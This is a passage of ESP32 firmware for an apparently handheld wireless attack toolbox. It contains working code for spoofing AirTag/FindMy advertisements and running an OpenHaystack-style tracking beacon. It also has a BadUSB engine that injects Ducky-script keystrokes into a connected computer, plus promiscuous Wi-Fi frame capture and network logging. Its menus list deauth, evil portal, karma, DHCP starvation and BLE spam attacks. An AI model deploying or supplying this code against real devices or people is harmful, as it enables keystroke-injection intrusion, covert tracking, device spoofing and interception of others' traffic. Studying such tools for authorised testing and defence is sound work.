        t.setTextColor(isDir ? Theme::AMBER : Theme::CYAN, sel ? Theme::PURPLE : Theme::TASKBAR);
        t.setTextDatum(ML_DATUM);
        t.drawString(s_sdFiles[i], 10, y + rowH / 2, 2);
    }

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.setTextDatum(MC_DATUM);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  AIRTAG SPOOF — broadcast fake AirTag BLE advertisements
// =============================================================================
static uint32_t s_airtagCount = 0;
static uint32_t s_airtagLastMs = 0;

static void airtagSpoofStart() {
    s_airtagCount = 0;
    s_airtagLastMs = 0;
    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    s_pAdv = NimBLEDevice::getAdvertising();
    Serial.println("[toolbox] AirTag spoof started");
}

static void airtagSpoofTick() {
    uint32_t now = millis();
    if (now - s_airtagLastMs < 2000) return;  // AirTags advertise every 2s
    s_airtagLastMs = now;
    s_pAdv->stop();

    // Apple FindMy / AirTag advertisement
    // Company ID 0x004C, type 0x12 (FindMy), length 0x19
    uint8_t mfgData[29];
    mfgData[0] = 0x4C; mfgData[1] = 0x00;  // Apple
    mfgData[2] = 0x12; mfgData[3] = 0x19;  // FindMy type + length
    mfgData[4] = 0x10;  // status byte
    // Random public key bytes (28 bytes of the EC P-224 public key)
    for (int i = 5; i < 29; i++) mfgData[i] = random(0, 256);
    mfgData[5] = (mfgData[5] & 0x3F) | 0x40;  // key type bits

    NimBLEAdvertisementData advData;
    advData.setFlags(0x06);
    advData.setManufacturerData(std::string((char*)mfgData, 29));

    s_pAdv->setAdvertisementData(advData);
    s_pAdv->start();
    s_airtagCount++;
}

static void drawAirtagSpoof(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();
    airtagSpoofTick();

    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("AIRTAG SPOOF", w / 2, HEADER_H + 20, 4);
    t.setTextColor(Theme::CYAN, Theme::BG);
    t.drawString("Broadcasting fake AirTag", w / 2, HEADER_H + 55, 2);
    t.drawString("Appears in FindMy network", w / 2, HEADER_H + 75, 2);

    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_airtagCount);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.drawString(buf, w / 2, h / 2 + 10, 7);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("beacons sent", w / 2, h / 2 + 50, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  HAYSTACK — Apple FindMy location beacon (OpenHaystack)
// =============================================================================
static uint32_t s_haystackCount = 0;
static uint32_t s_haystackLastMs = 0;
static uint8_t s_haystackKey[28];  // public key for tracking

static void haystackStart() {
    s_haystackCount = 0;
    s_haystackLastMs = 0;
    // Generate a persistent key for this session
    for (int i = 0; i < 28; i++) s_haystackKey[i] = random(0, 256);
    s_haystackKey[0] = (s_haystackKey[0] & 0x3F) | 0x40;
    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    s_pAdv = NimBLEDevice::getAdvertising();
    Serial.println("[toolbox] Haystack beacon started");
    Serial.printf("[haystack] Key: ");
    for (int i = 0; i < 28; i++) Serial.printf("%02X", s_haystackKey[i]);
    Serial.println();
}

static void haystackTick() {
    uint32_t now = millis();
    if (now - s_haystackLastMs < 2000) return;
    s_haystackLastMs = now;
    s_pAdv->stop();

    uint8_t mfgData[29];
    mfgData[0] = 0x4C; mfgData[1] = 0x00;
    mfgData[2] = 0x12; mfgData[3] = 0x19;
    mfgData[4] = 0x10;
    memcpy(mfgData + 5, s_haystackKey, 24);  // first 24 bytes of key

    NimBLEAdvertisementData advData;
    advData.setFlags(0x06);
    advData.setManufacturerData(std::string((char*)mfgData, 29));

    // Set the remaining key bytes in the BLE address
    uint8_t addr[6];
    addr[0] = s_haystackKey[24] | 0xC0;  // random static address
    addr[1] = s_haystackKey[25];
    addr[2] = s_haystackKey[26];
    addr[3] = s_haystackKey[27];
    addr[4] = (uint8_t)(s_haystackCount & 0xFF);
    addr[5] = (uint8_t)((s_haystackCount >> 8) & 0xFF);

    s_pAdv->setAdvertisementData(advData);
    s_pAdv->start();
    s_haystackCount++;
}

static void drawHaystack(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();
    haystackTick();

    t.setTextColor(Theme::GREEN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("HAYSTACK BEACON", w / 2, HEADER_H + 20, 4);
    t.setTextColor(Theme::CYAN, Theme::BG);
    t.drawString("Apple FindMy location relay", w / 2, HEADER_H + 50, 2);
    t.drawString("Nearby iPhones relay position", w / 2, HEADER_H + 70, 2);

    // Show truncated key
    char keyBuf[20];
    snprintf(keyBuf, sizeof keyBuf, "Key: %02X%02X%02X%02X...",
             s_haystackKey[0], s_haystackKey[1], s_haystackKey[2], s_haystackKey[3]);
    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
    t.drawString(keyBuf, w / 2, HEADER_H + 95, 2);

    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_haystackCount);
    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    t.drawString(buf, w / 2, h / 2 + 10, 7);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("beacons sent", w / 2, h / 2 + 50, 2);

    t.setTextColor(Theme::VAPOR_YELLOW, Theme::BG);
    t.drawString("Key printed to Serial", w / 2, h - 55, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  BADUSB — Ducky Script from SD card
// =============================================================================
#include <USB.h>
#include <USBHIDKeyboard.h>

static USBHIDKeyboard* s_usbKb = nullptr;
static bool s_usbRunning = false;
static String s_duckyFile = "";
static int s_duckyLine = 0;
static int s_duckyTotal = 0;

static void badUsbStart() {
    s_usbRunning = false;
    s_duckyLine = 0;
    s_duckyTotal = 0;
    s_duckyFile = "";

    // List .txt files on SD as potential ducky scripts
    SD_MMC.setPins(5, 4, 6, 7, 2, 3);
    if (!SD_MMC.begin("/sd", false, false)) {
        Serial.println("[toolbox] SD mount failed for ducky");
        return;
    }

    // Look for ducky scripts in /badusb/ or root
    fs::File dir = SD_MMC.open("/badusb");
    if (!dir || !dir.isDirectory()) dir = SD_MMC.open("/");
    if (!dir) return;

    // Find first .txt file
    fs::File entry;
    while ((entry = dir.openNextFile())) {
        String name = entry.name();
        if (name.endsWith(".txt") || name.endsWith(".ducky")) {
            s_duckyFile = name;
            entry.close();
            break;
        }
        entry.close();
    }
    dir.close();

    if (s_duckyFile.length() == 0) {
        Serial.println("[toolbox] No ducky scripts found on SD");
        return;
    }

    // Init USB HID keyboard
    if (!s_usbKb) {
        s_usbKb = new USBHIDKeyboard();
        USB.begin();
        s_usbKb->begin();
    }

    // Count lines
    fs::File f = SD_MMC.open(s_duckyFile);
    if (f) {
        while (f.available()) { if (f.read() == '\n') s_duckyTotal++; }
        s_duckyTotal++;
        f.close();
    }

    // Execute
    f = SD_MMC.open(s_duckyFile);
    if (!f) return;
    s_usbRunning = true;
    s_duckyLine = 0;

    while (f.available() && s_usbRunning) {
        String line = f.readStringUntil('\n');
        line.trim();
        s_duckyLine++;

        if (line.startsWith("REM") || line.length() == 0) continue;
        else if (line.startsWith("DELAY ")) {
            int ms = line.substring(6).toInt();
            delay(ms);
        }
        else if (line.startsWith("STRING ")) {
            s_usbKb->print(line.substring(7));
        }
        else if (line == "ENTER") s_usbKb->press(KEY_RETURN);
        else if (line == "TAB") s_usbKb->press(KEY_TAB);
        else if (line == "ESCAPE" || line == "ESC") s_usbKb->press(KEY_ESC);
        else if (line == "BACKSPACE") s_usbKb->press(KEY_BACKSPACE);
        else if (line == "DELETE") s_usbKb->press(KEY_DELETE);
        else if (line == "SPACE") s_usbKb->press(' ');
        else if (line == "UP" || line == "UPARROW") s_usbKb->press(KEY_UP_ARROW);
        else if (line == "DOWN" || line == "DOWNARROW") s_usbKb->press(KEY_DOWN_ARROW);
        else if (line == "LEFT" || line == "LEFTARROW") s_usbKb->press(KEY_LEFT_ARROW);
        else if (line == "RIGHT" || line == "RIGHTARROW") s_usbKb->press(KEY_RIGHT_ARROW);
        else if (line.startsWith("GUI ") || line.startsWith("WINDOWS ")) {
            s_usbKb->press(KEY_LEFT_GUI);
            s_usbKb->press(line.charAt(line.indexOf(' ') + 1));
        }
        else if (line.startsWith("ALT ")) {
            s_usbKb->press(KEY_LEFT_ALT);
            s_usbKb->press(line.charAt(4));
        }
        else if (line.startsWith("CTRL ") || line.startsWith("CONTROL ")) {
            s_usbKb->press(KEY_LEFT_CTRL);
            int sp = line.indexOf(' ');
            s_usbKb->press(line.charAt(sp + 1));
        }
        else if (line.startsWith("SHIFT ")) {
            s_usbKb->press(KEY_LEFT_SHIFT);
            s_usbKb->press(line.charAt(6));
        }

        s_usbKb->releaseAll();
        delay(5);
    }
    f.close();
    s_usbRunning = false;
    Serial.printf("[toolbox] Ducky script done: %s (%d lines)\n", s_duckyFile.c_str(), s_duckyLine);
}

static void drawBadUsb(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    t.setTextColor(Theme::RED, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("BAD USB", w / 2, HEADER_H + 20, 4);

    if (s_duckyFile.length() > 0) {
        t.setTextColor(Theme::CYAN, Theme::BG);
        t.drawString(s_duckyFile, w / 2, HEADER_H + 55, 2);

        char buf[32];
        snprintf(buf, sizeof buf, "Line %d / %d", s_duckyLine, s_duckyTotal);
        t.setTextColor(s_usbRunning ? Theme::GREEN : Theme::AMBER, Theme::BG);
        t.drawString(buf, w / 2, h / 2, 4);
        t.drawString(s_usbRunning ? "EXECUTING..." : "COMPLETE", w / 2, h / 2 + 35, 2);
    } else {
        t.setTextColor(Theme::AMBER, Theme::BG);
        t.drawString("No .txt or .ducky files", w / 2, h / 2 - 10, 2);
        t.drawString("found on SD card", w / 2, h / 2 + 10, 2);
        t.drawString("Place scripts in /badusb/", w / 2, h / 2 + 35, 2);
    }

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  USB KEYBOARD — live keystroke entry via USB HID
// =============================================================================
static void usbKeyboardStart() {
    if (!s_usbKb) {
        s_usbKb = new USBHIDKeyboard();
        USB.begin();
        s_usbKb->begin();
    }
    Serial.println("[toolbox] USB keyboard mode active");
}

static void drawUsbKeyboard(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    t.setTextColor(Theme::CYAN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("USB KEYBOARD", w / 2, HEADER_H + 20, 4);
    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
    t.drawString("Device appears as HID keyboard", w / 2, HEADER_H + 55, 2);
    t.drawString("to connected host", w / 2, HEADER_H + 75, 2);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.drawString("ACTIVE", w / 2, h / 2, 4);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("Serial input -> keystrokes", w / 2, h / 2 + 35, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  PCAP CAPTURE — save WiFi frames to SD in PCAP format
// =============================================================================
static uint32_t s_pcapFrames = 0;
static fs::File s_pcapFile;
static bool s_pcapOpen = false;

static void pcapWriteHeader() {
    // PCAP global header
    uint8_t hdr[24] = {
        0xD4, 0xC3, 0xB2, 0xA1,  // magic
        0x02, 0x00, 0x04, 0x00,  // version 2.4
        0x00, 0x00, 0x00, 0x00,  // timezone
        0x00, 0x00, 0x00, 0x00,  // sigfigs
        0xFF, 0xFF, 0x00, 0x00,  // snaplen 65535
        0x69, 0x00, 0x00, 0x00   // link type 105 = IEEE 802.11
    };
    s_pcapFile.write(hdr, 24);
}

static void IRAM_ATTR pcapSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_pcapOpen) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    if (len <= 0 || len > 2500) return;

    uint32_t ts_sec = millis() / 1000;
    uint32_t ts_usec = (millis() % 1000) * 1000;
    uint32_t incl_len = len;
    uint32_t orig_len = len;

    // PCAP packet header (16 bytes)
    uint8_t phdr[16];
    memcpy(phdr, &ts_sec, 4);
    memcpy(phdr + 4, &ts_usec, 4);
    memcpy(phdr + 8, &incl_len, 4);
    memcpy(phdr + 12, &orig_len, 4);
    s_pcapFile.write(phdr, 16);
    s_pcapFile.write(pkt->payload, len);
    s_pcapFrames++;
}

static void pcapCaptureStart() {
    s_pcapFrames = 0;
    s_pcapOpen = false;
    SD_MMC.setPins(5, 4, 6, 7, 2, 3);
    if (!SD_MMC.begin("/sd", false, false)) {
        Serial.println("[toolbox] SD mount failed for PCAP");
        return;
    }
    char fname[32];
    snprintf(fname, sizeof fname, "/pcap_%lu.pcap", millis());
    s_pcapFile = SD_MMC.open(fname, FILE_WRITE);
    if (!s_pcapFile) {
        Serial.println("[toolbox] Failed to create PCAP file");
        return;
    }
    pcapWriteHeader();
    s_pcapOpen = true;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(pcapSniffCb);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[toolbox] PCAP capture started: %s\n", fname);
}

static void pcapCaptureStop() {
    esp_wifi_set_promiscuous(false);
    if (s_pcapOpen) {
        s_pcapFile.flush();
        s_pcapFile.close();
        s_pcapOpen = false;
    }
    WiFi.mode(WIFI_OFF);
}

static uint8_t s_pcapChan = 1;
static uint32_t s_pcapHopMs = 0;

static void drawPcapCapture(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    // Hop channels
    if (now - s_pcapHopMs > 500) {
        s_pcapHopMs = now;
        s_pcapChan = (s_pcapChan % 13) + 1;
        esp_wifi_set_channel(s_pcapChan, WIFI_SECOND_CHAN_NONE);
    }

    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("PCAP CAPTURE", w / 2, HEADER_H + 20, 4);

    char buf[48];
    snprintf(buf, sizeof buf, "CH%d  |  Saving to SD", s_pcapChan);
    t.setTextColor(Theme::CYAN, Theme::BG);
    t.drawString(buf, w / 2, HEADER_H + 55, 2);

    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_pcapFrames);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.drawString(buf, w / 2, h / 2, 7);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("frames captured", w / 2, h / 2 + 40, 2);

    uint32_t kb = s_pcapFrames * 200 / 1024;  // rough estimate
    snprintf(buf, sizeof buf, "~%lu KB written", (unsigned long)kb);
    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
    t.drawString(buf, w / 2, h / 2 + 65, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  WIFI LOGGER — log all visible networks to SD
// =============================================================================
static uint32_t s_wifiLogCount = 0;
static fs::File s_wifiLogFile;
static bool s_wifiLogOpen = false;
static uint32_t s_wifiLogLastScan = 0;

static void wifiLoggerStart() {
    s_wifiLogCount = 0;
    s_wifiLogOpen = false;
    SD_MMC.setPins(5, 4, 6, 7, 2, 3);
    if (!SD_MMC.begin("/sd", false, false)) return;
    char fname[32];
    snprintf(fname, sizeof fname, "/wifi_%lu.csv", millis());
    s_wifiLogFile = SD_MMC.open(fname, FILE_WRITE);
    if (!s_wifiLogFile) return;
    s_wifiLogFile.println("timestamp,ssid,bssid,rssi,channel,encryption");
    s_wifiLogOpen = true;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    s_wifiLogLastScan = 0;
    Serial.printf("[toolbox] WiFi logger started: %s\n", fname);
}

static void wifiLoggerStop() {
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    if (s_wifiLogOpen) { s_wifiLogFile.flush(); s_wifiLogFile.close(); s_wifiLogOpen = false; }
}

static void drawWifiLogger(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    // Periodic scan every 10 seconds
    if (now - s_wifiLogLastScan > 10000) {
        s_wifiLogLastScan = now;
        int n = WiFi.scanNetworks(false, true);
        if (n > 0 && s_wifiLogOpen) {
            for (int i = 0; i < n; i++) {
                s_wifiLogFile.printf("%lu,%s,%s,%d,%d,%d\n",
                    now / 1000, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(),
                    WiFi.RSSI(i), WiFi.channel(i), WiFi.encryptionType(i));
                s_wifiLogCount++;
            }
            s_wifiLogFile.flush();
        }
        WiFi.scanDelete();
    }

    t.setTextColor(Theme::CYAN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("WIFI LOGGER", w / 2, HEADER_H + 20, 4);
    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
    t.drawString("Logging networks to SD (CSV)", w / 2, HEADER_H + 55, 2);

    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_wifiLogCount);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.drawString(buf, w / 2, h / 2, 7);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("entries logged", w / 2, h / 2 + 40, 2);

    uint32_t elapsed = (now - s_toolStartMs) / 1000;
    snprintf(buf, sizeof buf, "%02lu:%02lu elapsed", elapsed / 60, elapsed % 60);
    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
    t.drawString(buf, w / 2, h / 2 + 65, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  Tool stop / cleanup
// =============================================================================
static void stopActiveTool() {
    switch (s_activeTool) {
        case ActiveTool::WIFI_SCAN:
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            break;
        case ActiveTool::DEAUTH:
            WiFi.mode(WIFI_OFF);
            break;
        case ActiveTool::BEACON_SPAM:
        case ActiveTool::RICKROLL:
            WiFi.mode(WIFI_OFF);
            break;
        case ActiveTool::CLONE_AP:
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_OFF);
            break;
        case ActiveTool::KARMA:
            karmaStop();
            break;
        case ActiveTool::DHCP_STARVE:
            WiFi.disconnect();
            WiFi.mode(WIFI_OFF);
            break;
        case ActiveTool::EVIL_PORTAL:
            evilPortalStop();
            break;
        case ActiveTool::PROBE_SNIFF:
            probeSniffStop();
            break;
        case ActiveTool::BLE_SCAN:
            if (s_pBLEScan && s_pBLEScan->isScanning()) s_pBLEScan->stop();
            break;
        case ActiveTool::APPLE_SPAM:
        case ActiveTool::SAMSUNG_SPAM:
        case ActiveTool::SWIFTPAIR_SPAM:
            if (s_pAdv) { s_pAdv->stop(); s_pAdv = nullptr; }
            break;
        case ActiveTool::BLE_TRACK:
            if (s_pTrackScan && s_pTrackScan->isScanning()) s_pTrackScan->stop();
            break;
        case ActiveTool::FLIPPER_DETECT: {
            NimBLEScan* sc = NimBLEDevice::getScan();
            if (sc && sc->isScanning()) sc->stop();
            break;
        }
        case ActiveTool::AIRTAG_SPOOF:
        case ActiveTool::HAYSTACK:
            if (s_pAdv) { s_pAdv->stop(); s_pAdv = nullptr; }
            break;
        case ActiveTool::BADUSB_DUCKY:
        case ActiveTool::USB_KEYBOARD:
            if (s_usbKb) { s_usbKb->releaseAll(); }
            break;
        case ActiveTool::PCAP_CAPTURE:
            pcapCaptureStop();
            break;
        case ActiveTool::WIFI_LOGGER:
            wifiLoggerStop();
            break;
        case ActiveTool::SD_BROWSER:
        case ActiveTool::PCAP_VIEWER:
        case ActiveTool::USB_WIRESHARK:
            break;
        default: break;
    }
    s_activeTool = ActiveTool::NONE;
    s_toolActive = false;
    Serial.println("[toolbox] tool stopped");
}

// =============================================================================
//  Tool launch
// =============================================================================
static void launchTool(ActiveTool tool) {
    s_activeTool = tool;
    s_toolActive = true;
    s_toolStartMs = millis();
    s_toolScroll = 0;
    s_level = ToolboxLevel::TOOL_RUNNING;
    switch (tool) {
        case ActiveTool::WIFI_SCAN:   wifiScanStart();   break;
        case ActiveTool::DEAUTH:      /* needs target, handled separately */ break;
        case ActiveTool::BEACON_SPAM: beaconSpamStart();  break;
        case ActiveTool::RICKROLL:      rickrollStart();    break;
        case ActiveTool::EVIL_PORTAL:   evilPortalStart();  break;
        case ActiveTool::KARMA:         karmaStart();       break;
        case ActiveTool::DHCP_STARVE:   dhcpStarveStart();  break;
        case ActiveTool::PROBE_SNIFF: probeSniffStart();  break;
        case ActiveTool::BLE_SCAN:    bleScanStart();     break;
        case ActiveTool::APPLE_SPAM:    appleSpamStart();   break;
        case ActiveTool::SAMSUNG_SPAM:  samsungSpamStart(); break;
        case ActiveTool::SWIFTPAIR_SPAM: swiftPairStart();  break;
        case ActiveTool::BLE_TRACK:      /* started via bleTrackStart() */ break;
        case ActiveTool::FLIPPER_DETECT: flipperDetectStart(); break;
        case ActiveTool::AIRTAG_SPOOF:   airtagSpoofStart();   break;
        case ActiveTool::HAYSTACK:       haystackStart();       break;
        case ActiveTool::BADUSB_DUCKY:   badUsbStart();         break;
        case ActiveTool::USB_KEYBOARD:   usbKeyboardStart();    break;
        case ActiveTool::PCAP_CAPTURE:   pcapCaptureStart();    break;
        case ActiveTool::WIFI_LOGGER:    wifiLoggerStart();     break;
        case ActiveTool::SD_BROWSER:     sdBrowserStart();      break;
        default: break;
    }
}

// =============================================================================
//  Menu labels (unchanged)
// =============================================================================
static const char* CAT_LABELS_PLAIN[] = {
    "WIFI ATTACKS", "BLE TOOLS", "USB / BADUSB", "UTILITIES", "< BACK"
};
static const char* WIFI_LABELS[] = {
    "SCAN NETWORKS", "DEAUTH", "BEACON SPAM", "EVIL PORTAL",
    "PROBE SNIFF", "PMKID CAPTURE", "HANDSHAKE CAPTURE", "PCAP TO SD",
    "DHCP STARVE", "AP CLONE", "KARMA", "RICKROLL", "< BACK"
};
static const char* BLE_LABELS[] = {
    "SCAN DEVICES", "APPLE SPAM", "SAMSUNG SPAM", "SWIFTPAIR SPAM",
    "AIRTAG SPOOF", "FLIPPER DETECT", "BLE ENUMERATE", "HAYSTACK (FINDMY)", "< BACK"
};
static const char* USB_LABELS[] = {
    "DUCKY SCRIPT (SD)", "USB KEYBOARD", "< BACK"
};
static const char* UTIL_LABELS[] = {
    "SD BROWSER", "WIFI LOGGER", "PCAP VIEWER", "USB WIRESHARK", "< BACK"
};

static const char** labelsForLevel(ToolboxLevel lvl, int& count) {
    switch (lvl) {
        case ToolboxLevel::CATEGORIES: count = (int)ToolCategory::COUNT;  return CAT_LABELS_PLAIN;
        case ToolboxLevel::WIFI_TOOLS: count = (int)WifiTool::COUNT;     return WIFI_LABELS;
        case ToolboxLevel::BLE_TOOLS:  count = (int)BleTool::COUNT;      return BLE_LABELS;
        case ToolboxLevel::USB_TOOLS:  count = (int)UsbTool::COUNT;      return USB_LABELS;
        case ToolboxLevel::UTIL_TOOLS: count = (int)UtilTool::COUNT;     return UTIL_LABELS;
        default: count = 0; return nullptr;
    }
}

static const char* headerForLevel(ToolboxLevel lvl) {
    switch (lvl) {
        case ToolboxLevel::CATEGORIES: return "TOOLBOX";
        case ToolboxLevel::WIFI_TOOLS: return "WIFI ATTACKS";
        case ToolboxLevel::BLE_TOOLS:  return "BLE TOOLS";
        case ToolboxLevel::USB_TOOLS:  return "USB / BADUSB";
        case ToolboxLevel::UTIL_TOOLS: return "UTILITIES";
        case ToolboxLevel::TOOL_RUNNING:
            switch (s_activeTool) {
                case ActiveTool::WIFI_SCAN:   return "WIFI SCAN";
                case ActiveTool::DEAUTH:      return "DEAUTH";
                case ActiveTool::BEACON_SPAM: return "BEACON SPAM";
                case ActiveTool::RICKROLL:    return "RICKROLL";
                case ActiveTool::CLONE_AP:    return "CLONE AP";
                case ActiveTool::EVIL_PORTAL: return "EVIL PORTAL";
                case ActiveTool::KARMA:       return "KARMA";
                case ActiveTool::DHCP_STARVE: return "DHCP STARVE";
                case ActiveTool::PROBE_SNIFF: return "PROBE SNIFF";
                case ActiveTool::BLE_SCAN:    return "BLE SCAN";
                case ActiveTool::APPLE_SPAM:    return "APPLE SPAM";
                case ActiveTool::SAMSUNG_SPAM:  return "SAMSUNG SPAM";
                case ActiveTool::SWIFTPAIR_SPAM: return "SWIFTPAIR";
                case ActiveTool::BLE_TRACK:      return "BLE TRACK";
                case ActiveTool::FLIPPER_DETECT: return "FLIPPER DETECT";
                case ActiveTool::AIRTAG_SPOOF:   return "AIRTAG SPOOF";
                case ActiveTool::HAYSTACK:       return "HAYSTACK";
                case ActiveTool::BADUSB_DUCKY:   return "BAD USB";
                case ActiveTool::USB_KEYBOARD:   return "USB KEYBOARD";
                case ActiveTool::PCAP_CAPTURE:   return "PCAP CAPTURE";
                case ActiveTool::WIFI_LOGGER:    return "WIFI LOGGER";
                case ActiveTool::SD_BROWSER:     return "SD BROWSER";
                default:                      return "RUNNING...";
            }
        default: return "TOOLBOX";
    }
}

// =============================================================================
//  Draw helpers
// =============================================================================
static void drawRow(TFT_eSPI& t, int x, int y, int w, const char* label, bool highlight) {
    const uint16_t bg = highlight ? Theme::PURPLE : Theme::TASKBAR;
    const uint16_t fg = highlight ? Theme::BG     : Theme::CYAN;
    t.fillRoundRect(x, y, w, ROW_H - 4, 6, bg);
    t.setTextColor(fg, bg);
    t.setTextSize(1);
    t.setTextDatum(ML_DATUM);
    t.drawString(label, x + 14, y + ROW_H / 2 - 2, 2);
}

static void drawMenuRows(TFT_eSPI& t) {
    const int w = t.width();
    const int h = t.height();
    int count = 0;
    const char** labels = labelsForLevel(s_level, count);
    if (!labels) return;

    const int menuTop = HEADER_H + ROW_PAD;
    int visibleRows = (h - menuTop) / (ROW_H + ROW_PAD);

    for (int i = 0; i < count; i++) {
        int drawIdx = i - s_scroll;
        if (drawIdx < 0 || drawIdx >= visibleRows) continue;
        int y = menuTop + drawIdx * (ROW_H + ROW_PAD);
        bool isBack = (i == count - 1);
        bool hl = (i == s_selected);

        if (isBack) {
            t.fillRoundRect(ROW_PAD, y, w - ROW_PAD * 2, ROW_H - 4, 6, Theme::BG);
            t.setTextColor(Theme::AMBER, Theme::BG);
            t.setTextDatum(ML_DATUM);
            t.drawString(labels[i], ROW_PAD + 14, y + ROW_H / 2 - 2, 2);
        } else {
            drawRow(t, ROW_PAD, y, w - ROW_PAD * 2, labels[i], hl);
        }
    }
}

// =============================================================================
//  Long press detection
// =============================================================================
void uiToolboxTouch(bool down, int16_t x, int16_t y, uint32_t now) {
    if (down && !s_fingerDown) {
        // Finger just came down
        s_fingerDown = true;
        s_downX = x; s_downY = y;
        s_downMs = now;
        s_longPressFired = false;
    } else if (down && s_fingerDown && !s_longPressFired) {
        // Finger still held — check distance and time
        int dx = abs(x - s_downX), dy = abs(y - s_downY);
        if (dx > 15 || dy > 15) {
            // Moved too much — cancel
            s_longPressFired = true;  // prevent firing
        } else if (now - s_downMs >= LONG_PRESS_MS) {
            s_longPressFired = true;
            // Fire long press on scan results
            if (s_level == ToolboxLevel::TOOL_RUNNING) {
                int listTop = HEADER_H + 22;
                int row = (s_downY - listTop) / (RESULT_H + RESULT_PAD) + s_toolScroll;

                if (s_activeTool == ActiveTool::WIFI_SCAN && !s_scanning &&
                    row >= 0 && row < s_scanCount) {
                    s_contextTarget = row;
                    s_scanSelected = row;
                    s_contextMenuOpen = true;
                    s_contextType = ContextType::WIFI;
                    Serial.printf("[toolbox] long press WiFi: %s\n", s_scanResults[row].ssid);
                }
                else if (s_activeTool == ActiveTool::BLE_SCAN && !s_bleScanning &&
                         row >= 0 && row < s_bleCount) {
                    s_contextTarget = row;
                    s_bleSelected = row;
                    s_contextMenuOpen = true;
                    s_contextType = ContextType::BLE;
                    Serial.printf("[toolbox] long press BLE: %s\n", s_bleResults[row].name);
                }
            }
        }
    } else if (!down) {
        s_fingerDown = false;
    }
}

// =============================================================================
//  Context menu drawing & handling
// =============================================================================
static void drawContextMenu(TFT_eSPI& t) {
    const int w = t.width();
    const int h = t.height();
    const int menuW = w - 40;
    const int rowH = 38;
    const char** labels;
    int count;
    if (s_contextType == ContextType::BLE) {
        labels = BLE_CTX_LABELS; count = BLE_CTX_COUNT;
    } else {
        labels = WIFI_CTX_LABELS; count = WIFI_CTX_COUNT;
    }
    const int menuH = count * rowH + 50;
    const int menuX = 20;
    const int menuY = (h - menuH) / 2;

    t.fillRect(0, 0, w, h, Theme::BG);

    // Menu card
    t.fillRoundRect(menuX, menuY, menuW, menuH, 10, Theme::TASKBAR);
    t.drawRoundRect(menuX, menuY, menuW, menuH, 10, Theme::PURPLE);
